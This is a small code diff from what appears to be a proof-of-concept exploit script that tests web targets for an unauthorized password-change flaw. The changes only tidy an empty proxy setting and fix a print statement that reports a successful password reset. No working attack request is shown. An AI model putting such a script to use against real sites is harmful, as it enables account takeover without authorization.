@@ -6,8 +6,7 @@ urllib3.disable_warnings()
 from bs4 import BeautifulSoup
 
 
-proxy = {
-}
+proxy = {}
 
 
 def check_poc1(url):
@@ -90,7 +89,7 @@ def check_poc2(url,password):
         r.encoding = "utf-8"
         if r.status_code == 200 and "修改密码成功" in r.text:
             print("[*] Password changed successfully,URL: "+url+"\r")
-            print("UserName: {}, PassWord: 仅ikun可见")
+            print("UserName: {}, PassWord: 仅ikun可见".format(this_name))
         else:
             print("[-] Password change failed")
     except requests.exceptions.RequestException as e:
